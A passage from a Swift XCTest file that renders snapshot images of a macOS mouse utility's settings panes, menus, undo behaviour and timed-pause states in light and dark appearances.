            weChat.setUsesScrollingSettings(false, scrolling: Options.shared.scroll, thumbWheel: Options.shared.thumbWheel)
            return weChat
        })
        let ring = SystemShortcut.shortcutRing.identifier
        Options.shared.buttons.binding = [binding(5, ring)]
        try page("ring-long-mixed", part: .ring, app: {
            let long = Application(path: "/Applications/Remarkably Long Application.app")
            long.displayName = "Remarkably Long Application Name For Its Kind"
            long.setOwnButtonBindings([self.binding(3, ring), self.binding(4, ring)])
            return long
        })
    }
}

// MARK: - Round 3 C3

/// Round 3 C3 (`round3-c3-*-<appearance>.png`): General's row under the card in each of
/// its four states (Scrollio is on with Pause, paused with Resume, a start that failed with
/// Try Again Now, the access missing with Open System Settings), and "Restore…" as a pull-down
/// of the kept settings by local date and time, then "Show in Finder" (the row and its
/// menu, two backups of the same minute with their seconds).
extension PreferencesWindowRenderTests {

    func testRenderRound3C3General() throws {
        let savedAutoLaunch = Options.shared.general.autoLaunch
        defer {
            LoginItem.service = InertLoginItemService()
            Options.shared.general.autoLaunch = savedAutoLaunch
            LoginItem.service = LoginItem.defaultService
        }
        LoginItem.service = InertLoginItemService()
        let plain: [String: Any] = ["CFBundleShortVersionString": "1.0", "CFBundleVersion": "1"]
        let cases: [(name: String, access: Bool, paused: Bool, problem: StatusMenu.StartProblem?)] = [
            ("on", true, false, nil),
            ("paused", true, true, nil),
            ("could-not-start", true, false, .retrying),
            ("needs-access", false, false, nil),
        ]
        for item in cases {
            try renderPane(PANEL_IDENTIFIER.general, name: "round3-c3-general-" + item.name, prepare: { preferences in
                guard let general = preferences.controller(for: PANEL_IDENTIFIER.general)
                    as? PreferencesGeneralViewController else { return }
                general.isAccessGranted = { item.access }
                general.isPaused = { item.paused }
                general.startProblem = { item.problem }
                general.pause = {}
                general.resume = {}
                general.tryAgain = {}
                general.isMenuBarIconHidden = { false }
                general.bundleInfo = { plain }
            }, afterLoad: { controller in
                controller.viewWillAppear()
            })
        }

        // Three imports: five backups kept at most, two of them in the same minute.
        let folder = FileManager.default.temporaryDirectory
            .appendingPathComponent("ScrollioTests-render-round3-c3-\(UUID().uuidString)", isDirectory: true)
        addTeardownBlock { try? FileManager.default.removeItem(at: folder) }
        let center = SettingsFileCenter()
        center.backups = SettingsBackups(directory: folder)
        let start: TimeInterval = 1_794_476_527
        // A day and an hour later, then two of one minute two days later.
        let offsets: [TimeInterval] = [0, 90_000, 173_400, 173_420]
        for offset in offsets {
            try center.backups.write(Data("{}".utf8), now: Date(timeIntervalSince1970: start + offset))
        }
        var shown: PreferencesGeneralViewController?
        try renderPane(PANEL_IDENTIFIER.general, name: "round3-c3-general-restore", prepare: { preferences in
            guard let general = preferences.controller(for: PANEL_IDENTIFIER.general)
                as? PreferencesGeneralViewController else { return }
            general.isAccessGranted = { true }
            general.isPaused = { false }
            general.startProblem = { nil }
            general.isMenuBarIconHidden = { false }
            general.bundleInfo = { plain }
            general.settingsFiles = center
            shown = general
        }, afterLoad: { controller in
            controller.viewWillAppear()
        })
        let pullDown = try XCTUnwrap(shown?.restoreSettingsPullDown)
        XCTAssertEqual(pullDown.title, "Restore…")
        try round2Menu(try round2Shown(pullDown), name: "round3-c3-restore-menu")
    }
}

// MARK: - Round 3 C1

/// Round 3 C1 (`round3-c1-*-<appearance>.png`): the action menus tick what the row shows
/// (a listed action inside its category, which gets the dash and is drawn open beside the
/// menu; "Default"; Gesture Navigation and the Shortcut Ring with their "Show in" item; a
/// place of the ring; a gesture direction; Buttons' thumb wheel row with "Show in
/// Scrolling"), an app's Buttons part ("Show in Safari › Shortcut Ring", "Show in Safari ›
/// Scrolling"), and the Gestures pane's haptics line with "Show in Mouse".
extension PreferencesWindowRenderTests {

    func testRenderRound3C1Menus() throws {
        let trigger = RecordedEvent(type: .mouse, code: 3, modifiers: 0, deviceFilter: nil)
        func pullDown(_ action: String, use: ButtonActionPullDown.Use = .binding) -> ButtonActionPullDown {
            return ButtonActionPullDown(
                binding: ButtonBinding(triggerEvent: trigger, systemShortcutName: action, isEnabled: !action.isEmpty), use: use
            )
        }
        try round3C1Menu(pullDown(SystemShortcut.copy.identifier), name: "round3-c1-menu-copy")
        let back = pullDown("")
        back.defaultEffect = .back
        try round3C1Menu(back, name: "round3-c1-menu-default-back")
        try round3C1Menu(pullDown(SystemShortcut.mouseGestureNavigation.identifier), name: "round3-c1-menu-gesture-navigation")
        try round3C1Menu(pullDown(SystemShortcut.shortcutRing.identifier), name: "round3-c1-menu-shortcut-ring")
        try round3C1Menu(pullDown("custom::40:1048576"), name: "round3-c1-menu-recorded-keys")
        try round3C1Menu(pullDown(SystemShortcut.copy.identifier, use: .ringPlace), name: "round3-c1-menu-ring-place")
        try round3C1Menu(pullDown("", use: .ringPlace), name: "round3-c1-menu-ring-place-none")
        try round3C1Menu(
            pullDown(SystemShortcut.moveSpaceLeft.identifier, use: .gesture(showsLogiActions: false)),
            name: "round3-c1-menu-gesture-direction"
        )
        let wheel = ThumbWheelPullDown(function: .zoom)
        try round3C1Sheet(Array(try XCTUnwrap(wheel.menu).items.dropFirst()), opened: nil, name: "round3-c1-menu-thumb-wheel")
        XCTAssertEqual(wheel.settingsItem?.title, "Show in Scrolling")
    }

    /// Safari's Buttons part on an MX Master 4: Back opens Safari's Shortcut Ring, Forward
    /// runs Copy, the thumb wheel zooms; the page, the ring row's menu and the thumb wheel
    /// row's menu.
    func testRenderRound3C1AppButtons() throws {
        let stored = Options.shared.application.applications
        addTeardownBlock {
            Options.shared.application.applications = stored
            ButtonUtils.shared.invalidateCache()
        }
        Options.shared.buttons.binding = []
        let safari = Application(path: "/Applications/Safari.app")
        safari.setOwnButtonBindings([
            ButtonBinding(
                triggerEvent: RecordedEvent(type: .mouse, code: 3, modifiers: 0, deviceFilter: nil),
                systemShortcutName: SystemShortcut.shortcutRing.identifier
            ),
            ButtonBinding(
                triggerEvent: RecordedEvent(type: .mouse, code: 4, modifiers: 0, deviceFilter: nil),
                systemShortcutName: SystemShortcut.copy.identifier
            ),
        ])
        safari.setOwnThumbWheelFunction(.zoom)
        Options.shared.application.applications = EnhanceArray<Application>(withArray: [safari], matchKey: "path")
        let defaults = uiDefaults(advanced: false)
        var part: ApplicationButtonsViewController?
        try renderPane(PANEL_IDENTIFIER.application, name: "round3-c1-app-buttons", prepare: { preferences in
            (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                .uiStateDefaults = defaults
        }, afterLoad: { controller in
            let apps = controller as? PreferencesApplicationViewController
            apps?.openApplication(withID: safari.path, part: .buttons)
            part = apps?.detailController?.buttonsPart
            part?.deviceSource = ButtonsDeviceSource(
                captureStatus: { _ in .normal }, deviceName: { "MX Master 4" }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in }
            )
            part?.holdKeysThatCatch = { [] }
            part?.reloadRows()
        })
        let shown = try XCTUnwrap(part)
        let ring = try XCTUnwrap(shown.rows.first { $0.pullDown.isShortcutRingBound }).pullDown
        XCTAssertEqual(ring.ringSettingsItem?.title, "Show in Safari › Shortcut Ring")
        try round3C1Menu(ring, name: "round3-c1-menu-app-ring")
        let wheel = try XCTUnwrap(shown.thumbWheelRow).pullDown
        XCTAssertEqual(wheel.settingsItem?.title, "Show in Safari › Scrolling")
        try round3C1Sheet(Array(try XCTUnwrap(wheel.menu).items.dropFirst()), opened: nil, name: "round3-c1-menu-app-thumb-wheel")
    }

    /// The Gestures pane on an MX Master 4 whose haptics are off under Mouse: the line
    /// under the Logitech box with "Show in Mouse".
    func testRenderRound3C1GesturesHapticsOff() throws {
        let support = MouseGestureDeviceSupport(deviceTracking: true, haptics: true, hapticsOffOnMouse: true)
        var gesture = MouseGestureSettings.default
        gesture.mode = .discrete
        gesture.deviceTracking = true
        Options.shared.gesture = gesture
        Options.shared.logiMouse = LogiMouseSettings(hapticsOn: false)
        var pane: GesturesPreferencesViewController?
        try renderPane(GesturesPreferencesViewController.tabIdentifier, name: "round3-c1-gestures-haptics-off", replacement: {
            let gestures = GesturesPreferencesViewController(isInteractiveAvailable: { true })
            gestures.deviceSource = MouseGestureDeviceSource(support: { support }, refresh: {})
            gestures.bindingSummary = {
                MouseGestureBindingSummary(
                    hasGestureButton: true, hasLogitechGestureButton: true, buttonTitles: ["Gesture button"],
                    picture: self.gesturePicture(logitech: true)
                )
            }
            return gestures
        }, afterLoad: { controller in
            guard let gestures = controller as? GesturesPreferencesViewController else { return }
            pane = gestures
            gestures.previewView.prefersReducedMotion = { true }
            gestures.previewView.reduceMotionDidChange()
            gestures.previewView.mouseSource = { .mxMaster4 }
            gestures.previewView.reloadMouse()
        })
        XCTAssertEqual(try XCTUnwrap(pane).openMouseButton.title, "Show in Mouse")
    }

    /// Opens `pullDown`'s menu as AppKit does (its delegate is told, so the tick is set)
    /// and draws what it shows, with the category that has the dash drawn open beside it.
    private func round3C1Menu(_ pullDown: ButtonActionPullDown, name: String) throws {
        let menu = try XCTUnwrap(pullDown.menu)
        pullDown.menuWillOpen(menu)
        defer { pullDown.menuDidClose(menu) }
        let items = Array(menu.items.dropFirst().filter { !$0.isHidden })
        let opened = items.first { $0.state == .mixed && $0.submenu != nil }
        try round3C1Sheet(items, opened: opened, name: name)
    }

    private func round3C1Sheet(_ items: [NSMenuItem], opened: NSMenuItem?, name: String) throws {
        for (suffix, appearanceName) in [("light", NSAppearance.Name.aqua), ("dark", .darkAqua)] {
            let appearance = try XCTUnwrap(NSAppearance(named: appearanceName))
            let sheet = Round3C1MenuSheet(items: items, opened: opened)
            sheet.appearance = appearance
            try write(sheet, appearance: appearance, to: directory.appendingPathComponent("\(name)-\(suffix).png"))
        }
    }
}

/// A menu drawn in-process as a stand-in (a menu is a window of its own, which the tests
/// never open): each item's mark (✓ ticked, – the dash), its symbol, its title and a
/// submenu's chevron; and `opened`'s submenu as a second card beside it, level with it.
private final class Round3C1MenuSheet: NSView {

    private static let rowHeight: CGFloat = 22
    private static let separatorHeight: CGFloat = 11
    private static let inset: CGFloat = 5
    private static let gap: CGFloat = 4

    private let columns: [(items: [NSMenuItem], frame: NSRect)]

    init(items: [NSMenuItem], opened: NSMenuItem?) {
        let first = NSRect(origin: .zero, size: Self.size(of: items))
        var columns = [(items: items, frame: first)]
        if let opened, let submenu = opened.submenu {
            let sub = Array(submenu.items.filter { !$0.isHidden })
            let top = Self.top(of: opened, in: items) - Self.inset
            columns.append((sub, NSRect(origin: NSPoint(x: first.maxX + Self.gap, y: top), size: Self.size(of: sub))))
        }
        self.columns = columns
        let bounds = columns.reduce(NSRect.zero) { $0.union($1.frame) }
        super.init(frame: NSRect(x: 0, y: 0, width: bounds.maxX, height: bounds.maxY))
    }

    required init?(coder: NSCoder) {
        fatalError("built in code")
    }

    override var isFlipped: Bool {
        return true
    }

    private static func size(of items: [NSMenuItem]) -> NSSize {
        let font = NSFont.menuFont(ofSize: 0)
        let height = items.reduce(2 * inset) { $0 + ($1.isSeparatorItem ? separatorHeight : rowHeight) }
        let width = items.map { ($0.title as NSString).size(withAttributes: [.font: font]).width }.max() ?? 100
        return NSSize(width: ceil(width) + 72, height: height)
    }

    private static func top(of item: NSMenuItem, in items: [NSMenuItem]) -> CGFloat {
        var y = inset
        for other in items {
            if other === item { return y }
            y += other.isSeparatorItem ? separatorHeight : rowHeight
        }
        return y
    }

    override func draw(_ dirtyRect: NSRect) {
        let font = NSFont.menuFont(ofSize: 0)
        for column in columns {
            let card = NSBezierPath(roundedRect: column.frame.insetBy(dx: 0.5, dy: 0.5), xRadius: 8, yRadius: 8)
            NSColor.controlBackgroundColor.setFill()
            card.fill()
            NSColor.separatorColor.setStroke()
            card.stroke()
            var y = column.frame.minY + Self.inset
            for item in column.items {
                if item.isSeparatorItem {
                    NSColor.separatorColor.setFill()
                    NSRect(x: column.frame.minX + 12, y: y + 5, width: column.frame.width - 24, height: 1).fill()
                    y += Self.separatorHeight
                    continue
                }
                let color: NSColor = item.isEnabled ? .labelColor : .tertiaryLabelColor
                let attributes: [NSAttributedString.Key: Any] = [.font: font, .foregroundColor: color]
                let mark = item.state == .on ? "✓" : item.state == .mixed ? "–" : ""
                (mark as NSString).draw(at: NSPoint(x: column.frame.minX + 9, y: y + 3), withAttributes: attributes)
                var x = column.frame.minX + 24
                if let image = item.image {
                    let side: CGFloat = 16
                    let place = NSRect(x: x, y: y + (Self.rowHeight - side) / 2, width: side, height: side)
                    let tinted = NSImage(size: NSSize(width: side, height: side), flipped: false) { rect in
                        image.draw(in: rect)
                        color.setFill()
                        rect.fill(using: .sourceAtop)
                        return true
                    }
                    tinted.draw(in: place, from: .zero, operation: .sourceOver, fraction: 1, respectFlipped: true, hints: nil)
                    x += side + 6
                }
                (item.title as NSString).draw(at: NSPoint(x: x, y: y + 3), withAttributes: attributes)
                if item.submenu != nil {
                    let chevron = NSAttributedString(string: "›", attributes: [.font: font, .foregroundColor: NSColor.secondaryLabelColor])
                    chevron.draw(at: NSPoint(x: column.frame.maxX - 14 - chevron.size().width, y: y + 3))
                }
                y += Self.rowHeight
            }
        }
    }
}

// MARK: - Round 3 C4

extension PreferencesWindowRenderTests {

    /// What round 3 C4 changes (`r3-c4-<case>-<appearance>.png`). The Mouse pane in its new
    /// order (`mouse-*`): an MX Master 4 managed, not managed (the line under the switch),
    /// with a value refused ("Send Again"), an MX Master 3S, and no Logitech mouse (as
    /// before). The Apps pane after "Settings for …" of the menu bar (`apps-*`): Safari not
    /// on a list of two, an empty list, a long name; Calculator on the list (its page). The
    /// status menu (`menu-*`, a stand-in): Scrollio working with Safari in front, and paused.
    func testRenderRound3C4() throws {
        let master4 = MouseDeviceFixtures.mxMaster4()
        Options.shared.logiMouse = .default
        Options.shared.logiWheel = LogiWheelSettings(managedByScrollio: true)
        try renderMouse([master4], name: "r3-c4-mouse-managed")
        Options.shared.logiMouse = LogiMouseSettings(pointerDPI: 1600)
        try renderMouse([MouseDeviceFixtures.mxMaster4(mismatches: [.pointerSpeed: .refused])], name: "r3-c4-mouse-refused")
        Options.shared.logiMouse = .default
        Options.shared.logiWheel = .default
        try renderMouse([master4], name: "r3-c4-mouse-not-managed")
        try renderMouse([MouseDeviceFixtures.mxMaster3S()], name: "r3-c4-mouse-mx-master-3s")
        try renderMouse([], name: "r3-c4-mouse-no-mouse")

        let stored = Options.shared.application.applications
        addTeardownBlock { Options.shared.application.applications = stored }
        Options.shared.application.allowlist = false
        let safari = AppSmoothing.App(
            name: "Safari", bundlePath: "/Applications/Safari.app", executablePath: "/Applications/Safari.app/Contents/MacOS/Safari"
        )
        let calculator = AppSmoothing.App(
            name: "Calculator", bundlePath: "/System/Applications/Calculator.app",
            executablePath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"
        )
        let long = AppSmoothing.App(
            name: "Microsoft Visual Studio Code Insiders Edition With A Very Long Name",
            bundlePath: "/Applications/Long Test.app", executablePath: "/Applications/Long Test.app/Contents/MacOS/Long"
        )
        func apps(_ name: String, listed: [String], asked app: AppSmoothing.App) throws {
            let defaults = uiDefaults(advanced: false)
            try renderPane(PANEL_IDENTIFIER.application, name: "r3-c4-apps-\(name)", prepare: { preferences in
                let entries = listed.map { Application(path: $0) }
                Options.shared.application.applications = EnhanceArray<Application>(withArray: entries, matchKey: "path")
                (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                    .uiStateDefaults = defaults
            }, afterLoad: { controller in
                (controller as? PreferencesApplicationViewController)?.showSettings(for: app)
            })
        }
        let two = ["/System/Applications/Calculator.app", "/System/Applications/TextEdit.app"]
        try apps("safari-not-listed", listed: two, asked: safari)
        try apps("safari-empty-list", listed: [], asked: safari)
        try apps("long-name", listed: two, asked: long)
        try apps("calculator-listed", listed: two, asked: calculator)

        let actions = StatusMenuActions()
        let battery = StatusMenu.Battery(title: "MX Master 4: 75%", symbolName: "battery.75percent")
        let smoothing = StatusMenu.appSmoothingItem(
            front: safari, isScrollio: false, scrollingRuns: true, rule: .usesScrollingSettings,
            scrollingSmooth: true, limitedToListedApps: false
        )
        let settings = StatusMenu.appSettingsItem(front: safari, isScrollio: false)
        for (name, paused) in [("working", false), ("paused", true)] {
            let menu = NSMenu()
            let state = StatusMenu.State(
                hasAccess: true, isPaused: paused, showsDiagnostics: false, batteries: paused ? [] : [battery],
                appSmoothing: paused ? nil : smoothing, appSettings: settings
            )
            StatusMenu.build(into: menu, state: state, actions: actions)
            try renderMenuStandIn(menu.items, name: "r3-c4-menu-\(name)")
        }
    }
}

// MARK: - Round 3 C2

extension PreferencesWindowRenderTests {

    /// Undo shows where it acts (round 3, part of proposal 32; `r3-c2-<case>-<appearance>.png`),
    /// each after a change, a move to General and Edit › Undo: `ring`, the Shortcut Ring
    /// pane, its folded places open, the place lit and its row selected; `gestures`, the
    /// Gestures pane the same for Click; `app-ring`, an app's page on its Shortcut Ring part,
    /// the change made before the page closed.
    func testRenderRound3C2UndoShowsWhereItActs() throws {
        let stored = Options.shared.application.applications
        let savedRing = Options.shared.ring
        let savedGesture = Options.shared.gesture
        let savedBindings = Options.shared.buttons.binding
        addTeardownBlock {
            Options.shared.application.applications = stored
            Options.shared.ring = savedRing
            Options.shared.gesture = savedGesture
            Options.shared.buttons.binding = savedBindings
            ShortcutRingController.forgetPreparedFaces()
            ButtonUtils.shared.invalidateCache()
        }
        Options.shared.ring = .default
        Options.shared.gesture = .default
        Options.shared.buttons.binding = []
        var split: PreferencesSplitViewController?
        /// `change` as one step, General shown, then Undo.
        func undo(_ change: () -> Void, in controller: NSViewController, before leaving: () -> Void = {}) {
            guard let preferences = split, let undo = controller.view.window?.undoManager else {
                return XCTFail("no window")
            }
            undo.groupsByEvent = false
            undo.beginUndoGrouping()
            change()
            undo.endUndoGrouping()
            leaving()
            XCTAssertTrue(preferences.selectPane(withIdentifier: PANEL_IDENTIFIER.general))
            undo.undo()
            // The rows that open fade in and their chevron turns, which a window never shown
            // does not play: drawn as they end.
            func finish(_ view: NSView) {
                if let fold = view as? PreferencesDisclosureSection, fold.isExpanded {
                    fold.body.alphaValue = 1
                    fold.disclosure.chevron.turn = 1
                }
                view.subviews.forEach(finish)
            }
            if let content = preferences.view.window?.contentView {
                finish(content)
            }
        }

        try renderPane(RingPreferencesViewController.tabIdentifier, name: "r3-c2-ring", prepare: { split = $0 }, afterLoad: { controller in
            guard let ring = controller as? RingPreferencesViewController, let places = ring.placesSection else {
                return XCTFail("no ring")
            }
            places.setExpanded(true)
            undo({ ring.placePopUps[6].onShortcutSelected?(SystemShortcut.copy) }, in: ring, before: { places.setExpanded(false) })
        })

        try renderPane(GesturesPreferencesViewController.tabIdentifier, name: "r3-c2-gestures", prepare: { split = $0 }, afterLoad: { controller in
            guard let gestures = controller as? GesturesPreferencesViewController else { return XCTFail("no gestures") }
            gestures.directionsSection.setExpanded(true)
            undo(
                { gestures.controls.actionPopUp(for: .click).onShortcutSelected?(nil) }, in: gestures,
                before: { gestures.directionsSection.setExpanded(false) }
            )
        })

        let path = "/System/Applications/Calculator.app"
        let defaults = uiDefaults(advanced: false)
        try renderPane(PANEL_IDENTIFIER.application, name: "r3-c2-app-ring", prepare: { preferences in
            split = preferences
            let calculator = Application(path: path)
            calculator.setUsesGeneralRing(false, general: .default)
            Options.shared.application.applications = EnhanceArray<Application>(withArray: [calculator], matchKey: "path")
            (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                .uiStateDefaults = defaults
        }, afterLoad: { controller in
            guard let apps = controller as? PreferencesApplicationViewController else { return XCTFail("no apps") }
            apps.openApplication(withID: path, part: .ring)
            guard let ring = apps.detailController?.ringPart.ringController else { return XCTFail("no own ring") }
            undo({ ring.placePopUps[5].onShortcutSelected?(SystemShortcut.paste) }, in: ring, before: {
                apps.showList(focusList: false)
            })
        })
    }
}

// MARK: - Round 3 fix

extension PreferencesWindowRenderTests {

    /// What the round 3 fix changes (`r3-fix-<case>-<appearance>.png`): General after a
    /// start that failed ("Try Again Now") and without the access (one "Open System
    /// Settings": the Accessibility row keeps its sign and line); the line that offers an
    /// app, with a name that fits beside "Add" and one cut once; Calculator's own button
    /// running the gestures ("Show in Calculator › Buttons" on its page and in the Gestures
    /// pane's menu); and, each after a change, a move to General and Edit › Undo, Buttons with
    /// a removed row back and selected, Calculator's page on Buttons with its removed row
    /// back after the page closed, and Apps with a removed app back and selected.
    func testRenderRound3Fix() throws {
        let savedAutoLaunch = Options.shared.general.autoLaunch
        let storedApplications = Options.shared.application.applications
        defer {
            LoginItem.service = InertLoginItemService()
            Options.shared.general.autoLaunch = savedAutoLaunch
            LoginItem.service = LoginItem.defaultService
            Options.shared.application.applications = storedApplications
            ButtonUtils.shared.invalidateCache()
        }
        LoginItem.service = InertLoginItemService()
        let plain: [String: Any] = ["CFBundleShortVersionString": "1.0", "CFBundleVersion": "1"]
        for (name, access, problem) in [("general-could-not-start", true, StatusMenu.StartProblem.retrying), ("general-needs-access", false, nil)] {
            try renderPane(PANEL_IDENTIFIER.general, name: "r3-fix-" + name, prepare: { preferences in
                guard let general = preferences.controller(for: PANEL_IDENTIFIER.general)
                    as? PreferencesGeneralViewController else { return }
                general.isAccessGranted = { access }
                general.isPaused = { false }
                general.startProblem = { problem }
                general.pause = {}
                general.resume = {}
                general.tryAgain = {}
                general.isMenuBarIconHidden = { false }
                general.bundleInfo = { plain }
            }, afterLoad: { controller in
                controller.viewWillAppear()
            })
        }

        Options.shared.application.allowlist = false
        let two = ["/System/Applications/Calculator.app", "/System/Applications/TextEdit.app"]
        for (name, app) in [
            ("apps-offer-adobe", AppSmoothing.App(
                name: "Adobe Illustrator 2026",
                bundlePath: "/Applications/Adobe Test.app", executablePath: "/Applications/Adobe Test.app/Contents/MacOS/Adobe"
            )),
            ("apps-offer-long-name", AppSmoothing.App(
                name: "Microsoft Visual Studio Code Insiders Edition With A Very Long Name",
                bundlePath: "/Applications/Long Test.app", executablePath: "/Applications/Long Test.app/Contents/MacOS/Long"
            )),
        ] {
            let defaults = uiDefaults(advanced: false)
            try renderPane(PANEL_IDENTIFIER.application, name: "r3-fix-" + name, prepare: { preferences in
                Options.shared.application.applications = EnhanceArray<Application>(withArray: two.map { Application(path: $0) }, matchKey: "path")
                (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                    .uiStateDefaults = defaults
            }, afterLoad: { controller in
                (controller as? PreferencesApplicationViewController)?.showSettings(for: app)
            })
        }

        // Only Calculator's own button runs the gestures.
        let path = "/System/Applications/Calculator.app"
        Options.shared.buttons.binding = []
        Options.shared.gesture = .default
        func calculatorWithItsButton() -> Application {
            let calculator = Application(path: path)
            calculator.setOwnButtonBindings([round2Binding(3, SystemShortcut.mouseGestureNavigation.identifier)])
            Options.shared.application.applications = EnhanceArray<Application>(withArray: [calculator], matchKey: "path")
            ButtonUtils.shared.invalidateCache()
            return calculator
        }
        _ = calculatorWithItsButton()
        let pane = GesturesPreferencesViewController(isInteractiveAvailable: { true })
        pane.deviceSource = MouseGestureDeviceSource(support: { .none }, refresh: {})
        _ = pane.view
        let chooser: TriggerChooser = try XCTUnwrap(pane.triggerChooser)
        chooser.deviceSource = round2Source("MX Master 3S")
        chooser.holdKeys = { [] }
        pane.reload()
        let menu = try round2Shown(pane.gestureButtonButton)
        XCTAssertEqual(menu.last?.title, "Show in Calculator › Buttons")
        try round2Menu(menu, name: "r3-fix-gestures-trigger-menu")
        let pageDefaults = uiDefaults(advanced: false)
        try renderPane(PANEL_IDENTIFIER.application, name: "r3-fix-app-gestures", prepare: { preferences in
            _ = calculatorWithItsButton()
            (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                .uiStateDefaults = pageDefaults
        }, afterLoad: { controller in
            guard let apps = controller as? PreferencesApplicationViewController else { return XCTFail("no apps") }
            apps.openApplication(withID: path, part: .gestures)
            XCTAssertEqual(apps.detailController?.gesturesPart.holdButton.title, "Show in Calculator › Buttons")
        })

        // Undo from General.
        var split: PreferencesSplitViewController?
        func undo(_ change: () -> Void, in controller: NSViewController, before leaving: () -> Void = {}) {
            guard let preferences = split, let undo = controller.view.window?.undoManager else {
                return XCTFail("no window")
            }
            undo.groupsByEvent = false
            undo.beginUndoGrouping()
            change()
            undo.endUndoGrouping()
            leaving()
            XCTAssertTrue(preferences.selectPane(withIdentifier: PANEL_IDENTIFIER.general))
            undo.undo()
        }
        let copy = round2Binding(4, SystemShortcut.copy.identifier, modifiers: .maskAlternate)
        try renderPane(PANEL_IDENTIFIER.buttons, name: "r3-fix-undo-buttons", prepare: { preferences in
            split = preferences
            Options.shared.application.applications = EnhanceArray<Application>(withArray: [], matchKey: "path")
            Options.shared.buttons.binding = [copy, self.round2Binding(5, SystemShortcut.paste.identifier, modifiers: .maskAlternate)]
            (preferences.controller(for: PANEL_IDENTIFIER.buttons) as? PreferencesButtonsViewController)?.deviceSource = self.round2Source(nil)
        }, afterLoad: { controller in
            guard let buttons = controller as? PreferencesButtonsViewController else { return XCTFail("no buttons") }
            undo({ buttons.removeBinding(id: copy.id) }, in: buttons)
            XCTAssertEqual(split?.selectedPaneIdentifier, PANEL_IDENTIFIER.buttons)
        })
        Options.shared.buttons.binding = []

        try renderPane(PANEL_IDENTIFIER.application, name: "r3-fix-undo-app-buttons", prepare: { preferences in
            split = preferences
            _ = calculatorWithItsButton()
            (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                .uiStateDefaults = pageDefaults
        }, afterLoad: { controller in
            guard let apps = controller as? PreferencesApplicationViewController else { return XCTFail("no apps") }
            apps.openApplication(withID: path, part: .buttons)
            guard let part = apps.detailController?.buttonsPart, let own = part.application.ownButtonBindings.first else {
                return XCTFail("no own row")
            }
            undo({ part.removeOwnBinding(id: own.id) }, in: apps, before: { apps.showList(focusList: false) })
            XCTAssertEqual(apps.detailController?.shownPart, .buttons)
        })

        try renderPane(PANEL_IDENTIFIER.application, name: "r3-fix-undo-app-removed", prepare: { preferences in
            split = preferences
            Options.shared.application.applications = EnhanceArray<Application>(withArray: two.map { Application(path: $0) }, matchKey: "path")
            (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                .uiStateDefaults = pageDefaults
        }, afterLoad: { controller in
            guard let apps = controller as? PreferencesApplicationViewController else { return XCTFail("no apps") }
            undo({ apps.removeApplication(withID: path) }, in: apps)
            XCTAssertEqual(apps.list.selectedID, AnyHashable(path))
        })
    }
}

// MARK: - Round 4 D5

/// Round 4 D5 (`ux4-d5-*-<appearance>.png`): a pause that ends by itself. The menu bar
/// menu while Scrollio works ("Pause Scrollio", and "Pause For" under it, once as the menu
/// shows it and once with its two lengths open beside it), after a start that failed (both
/// under "Try Again Now") and paused for a time ("Scrollio is paused until 14:30" over
/// "Resume Scrollio"); General's row under the card while on (a plain "Pause", as before)
/// and paused for a time (the same title, "… are off until then." and "Resume"). The time
/// is 14:30 of the Mac's own clock, written as the Mac writes times.
extension PreferencesWindowRenderTests {

    func testRenderRound4D5PauseForAWhile() throws {
        let end = try XCTUnwrap(Calendar.current.date(bySettingHour: 14, minute: 30, second: 0, of: Date()))
        let actions = StatusMenuActions()
        let batteries = StatusMenu.batteries(from: [MouseDeviceFixtures.mxMaster4()])
        let safari = AppSmoothing.App(name: "Safari", bundlePath: "/Applications/Safari.app",
                                      executablePath: "/Applications/Safari.app/Contents/MacOS/Safari")
        let smoothing = StatusMenu.appSmoothingItem(front: safari, isScrollio: false, scrollingRuns: true,
                                                    rule: .usesScrollingSettings, scrollingSmooth: true, limitedToListedApps: false)
        let settings = StatusMenu.appSettingsItem(front: safari, isScrollio: false)
        func items(paused: Bool = false, problem: StatusMenu.StartProblem? = nil, pauseEnd: Date? = nil) -> [NSMenuItem] {
            let works = !paused && problem == nil
            var state = StatusMenu.State(
                hasAccess: true, isPaused: paused, showsDiagnostics: false, batteries: works ? batteries : [],
                appSmoothing: works ? smoothing : nil, appSettings: settings, updates: .check(enabled: true),
                startProblem: problem, pauseEnd: pauseEnd
            )
            state.isDebugBuild = false
            let menu = NSMenu()
            StatusMenu.build(into: menu, state: state, actions: actions)
            return menu.items
        }
        let on = items()
        try renderMenuStandIn(on, name: "ux4-d5-menu-on")
        let pauseFor = try XCTUnwrap(on.first { $0.hasSubmenu })
        XCTAssertEqual(pauseFor.title, "Pause For")
        try round3C1Sheet(on, opened: pauseFor, name: "ux4-d5-menu-pause-open")
        try renderMenuStandIn(items(problem: .retrying), name: "ux4-d5-menu-could-not-start")
        let paused = items(paused: true, pauseEnd: end)
        XCTAssertEqual(paused.first?.title, StatusMenu.titleText(.paused, pauseEnd: end))
        try renderMenuStandIn(paused, name: "ux4-d5-menu-paused-until")

        let savedAutoLaunch = Options.shared.general.autoLaunch
        defer {
            LoginItem.service = InertLoginItemService()
            Options.shared.general.autoLaunch = savedAutoLaunch
            LoginItem.service = LoginItem.defaultService
        }
        LoginItem.service = InertLoginItemService()
        let plain: [String: Any] = ["CFBundleShortVersionString": "1.0", "CFBundleVersion": "1"]
        for (name, pauseEnd) in [("on", nil), ("paused-until", end)] as [(String, Date?)] {
            try renderPane(PANEL_IDENTIFIER.general, name: "ux4-d5-general-" + name, prepare: { preferences in
                guard let general = preferences.controller(for: PANEL_IDENTIFIER.general)
                    as? PreferencesGeneralViewController else { return }
                general.isAccessGranted = { true }
                general.isPaused = { pauseEnd != nil }
                general.pauseEnd = { pauseEnd }
                general.startProblem = { nil }
                general.pause = {}
                general.resume = {}
                general.tryAgain = {}
                general.isMenuBarIconHidden = { false }
                general.bundleInfo = { plain }
            }, afterLoad: { controller in
                controller.viewWillAppear()
            })
        }
    }
}

// MARK: - Round 4 D2

/// Round 4, D2 (`round4-d2-*-<appearance>.png`): "Freeze pointer during a gesture" while
